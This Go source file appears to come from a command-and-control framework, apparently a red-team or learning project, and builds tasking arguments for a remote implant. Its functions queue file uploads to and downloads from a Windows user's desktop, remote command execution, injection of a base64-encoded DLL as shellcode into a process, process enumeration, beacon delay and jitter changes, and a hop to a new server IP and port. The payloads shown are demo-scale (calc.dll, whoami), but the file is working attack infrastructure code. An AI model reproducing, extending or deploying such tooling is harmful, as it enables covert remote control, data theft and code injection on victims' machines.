package router

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"os"
	"time"
)

func returnUploadStruct(w http.ResponseWriter) []byte {

	// HERE WE CREATE response.Data, UPLOAD SPECIFIC ARGUMENTS
	fileBytes, err := os.ReadFile("./dummy/dummy.txt")
	if err != nil {
		panic(fmt.Errorf("failed to read prerequisite file: %w", err))
	}
	hashBytes := sha256.Sum256(fileBytes)

	uploadArguments := models.UploadArgs{
		TargetDirectory:   "C:\\Users\\vuilhond\\Desktop\\",
		TargetFilename:    "dummy.txt",
		FileContentBase64: base64.StdEncoding.EncodeToString(fileBytes),
		ExpectedSha256:    fmt.Sprintf("%x", hashBytes),
		OverwriteIfExists: true,
	}

	uploadArgsJSON, err := json.Marshal(uploadArguments)
	if err != nil {
		log.Printf("Failed to marshal upload args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return uploadArgsJSON
}

func returnDownloadStruct(w http.ResponseWriter) []byte {

	downloadArguments := models.DownloadArgs{
		SourceFilePath: "C:\\Users\\vuilhond\\Desktop\\download_me.txt",
	}

	downloadArgsJSON, err := json.Marshal(downloadArguments)
	if err != nil {
		log.Printf("Failed to marshal download args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return downloadArgsJSON

}

func returnRunCmdStruct(w http.ResponseWriter) []byte {

	runCmdArguments := models.RunCmdArgs{
		CommandLine: "whoami",
	}

	runCmdArgsJSON, err := json.Marshal(runCmdArguments)
	if err != nil {
		log.Printf("Failed to marshal runcmd args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return runCmdArgsJSON

}

func returnShellcodeStruct(w http.ResponseWriter) []byte {

	pathToDLL := "./payloads/calc.dll"

	dllBytes, err := os.ReadFile(pathToDLL)
	if err != nil {
		log.Printf("Failed to read DLL file: %s", err)
	}

	encodedDLL := base64.StdEncoding.EncodeToString(dllBytes)

	shellcodeArguments := models.ShellcodeArgs{
		ShellcodeBase64: encodedDLL,
		TargetPID:       0,
		ExportName:      "LaunchCalc",
	}

	shellcodeArgsJSON, err := json.Marshal(shellcodeArguments)
	if err != nil {
		log.Printf("Failed to marshal runcmd args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return shellcodeArgsJSON

}

func returnEnumerateStruct(w http.ResponseWriter) []byte {
	// 50/50 chance it will either be notepad or nothing
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	var processName string
	if r.Intn(2) == 0 {
		processName = "notepad.exe"
	} else {
		processName = ""
	}

	enumerateArguments := models.EnumerateArgs{
		ProcessName: processName,
	}

	enumerateArgsJSON, err := json.Marshal(enumerateArguments)
	if err != nil {
		log.Printf("Failed to marshal enumerate args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return enumerateArgsJSON

}

// for the demo we'll do new delay of 10 and jitter of 50 (baseline is 5s and 0.20)
func returnMorphStruct(w http.ResponseWriter) []byte {
	newDelay := "10s"
	newJitter := 0.5

	morphArguments := models.MorphArgs{
		NewDelay:  &newDelay,
		NewJitter: &newJitter,
	}

	morphArgsJSON, err := json.Marshal(morphArguments)
	if err != nil {
		log.Printf("Failed to marshal morph args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return morphArgsJSON
}

// for the demo we'll do same IP, new IP and PORT
func returnHopStruct(w http.ResponseWriter) []byte {

	hopArguments := models.HopArgs{
		NewProtocol:   config.HTTP2TLS,
		NewServerIP:   "192.168.2.249",
		NewServerPort: "9999",
	}
	
	hopArgsJSON, err := json.Marshal(hopArguments)

	if err != nil {
		log.Printf("Failed to marshal hop args: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return nil
	}
	return hopArgsJSON
}
